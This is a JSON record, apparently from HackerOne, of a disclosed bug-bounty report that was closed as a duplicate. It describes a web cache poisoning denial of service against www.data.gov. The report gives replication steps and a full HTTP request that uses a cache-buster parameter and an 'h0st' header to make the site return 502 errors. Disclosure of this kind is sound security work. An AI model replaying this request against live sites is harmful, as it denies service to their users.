@@ -1,0 +1,135 @@
+{
+  "id": 942629,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDI2Mjk=",
+  "url": "https://hackerone.com/reports/942629",
+  "title": "Denial of service via cache poisoning on https://www.data.gov/",
+  "state": "Closed",
+  "substate": "duplicate",
+  "severity_rating": "high",
+  "readable_substate": "Duplicate",
+  "created_at": "2020-07-25T19:00:13.932Z",
+  "submitted_at": "2020-07-25T19:00:13.932Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kq8dq",
+    "url": "/kq8dq",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50592,
+    "url": "https://hackerone.com/gsa_bbp",
+    "handle": "gsa_bbp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GSA Bounty",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-15T19:42:54.864Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-09T00:16:11.763Z",
+  "team_member_agreed_on_going_public_at": "2021-06-15T19:42:54.741Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An attacker can persistently block access to any on https://www.data.gov/ by using cache poisoning with the h0st headers to cause\n502 response code。\n\nTo replicate:\nload https://www.data.gov/ in your browser.\nlook the burp ,  add ?xyzxyz=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.\nload https://www.data.gov/?xyzxyz=1 in your browser. again.\nand you win see 502 ERROR\n\n{F922984}\n\nTo be more clearer, see my video\n{F922983}\n\nmy http request：\n\n```\nGET /?xyzxyz=1 HTTP/1.1\nHost: www.data.gov\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nh0st: wrtqvavjigwdvoqk\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n```\n\n\nFor more information on the theory behind this attack, check out https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning\n\nSimilar report：\nhttps://hackerone.com/reports/622122\nhttps://hackerone.com/reports/409370\n\n## Impact\n\nAn attacker can persistently block access to any on https://www.data.gov/",
+  "original_report_id": 930484,
+  "original_report_url": "https://hackerone.com/reports/930484",
+  "attachments": [
+    {
+      "id": 922983,
+      "file_name": "20200726_024937.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uZqkNvZMyeE4DSVKTDXvQMtQ?response-content-disposition=attachment%3B%20filename%3D%2220200726_024937.mp4%22%3B%20filename%2A%3DUTF-8%27%2720200726_024937.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T230450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=038872b15280136eb1b5cd1f93365c8392002be65586d4f1065bc40a73ec998b",
+      "file_size": 5303332,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 922984,
+      "file_name": "20200726025249.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KwxKSBjmGLemgiHxG8y4DSk8?response-content-disposition=attachment%3B%20filename%3D%2220200726025249.png%22%3B%20filename%2A%3DUTF-8%27%2720200726025249.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T230450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=123643097751e7989fd65579f72506f333c0ebdf136e5b177a09d042d6a1ac22",
+      "file_size": 27086,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 12,
+  "voters": [
+    "tess",
+    "shubham_srt",
+    "prilvesh",
+    "dhakal_bibek",
+    "0nlymohammed",
+    "bughunter25",
+    "sandip5x05",
+    "ekgaribadmi",
+    "alsinwar",
+    "deepvector",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 81473,
+    "asset_type": "URL",
+    "asset_identifier": "www.data.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
